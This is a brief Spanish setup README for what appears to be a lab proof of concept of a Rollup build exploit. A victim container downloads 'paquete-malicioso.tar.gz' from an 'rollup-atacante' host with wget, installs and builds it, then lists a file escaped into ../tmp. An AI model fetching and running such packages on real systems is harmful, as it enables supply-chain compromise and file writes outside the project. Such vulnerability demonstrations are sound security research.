# Setup

## Inicializar contenedores
```bash
docker compose up -d --build
```

## rollup-victima

### Ejecutar
```bash
# Descargar proyecto
wget http://rollup-atacante:8000/paquete-malicioso.tar.gz

# Descomprimir archivo descargado
tar -xzvf paquete-malicioso.tar.gz

# Inicializar npm
npm install

# Ejecutar build.js
node build.js
```

### Visualizar
```bash
cd ../tmp
ls # archivo_escapado_poc.js
```
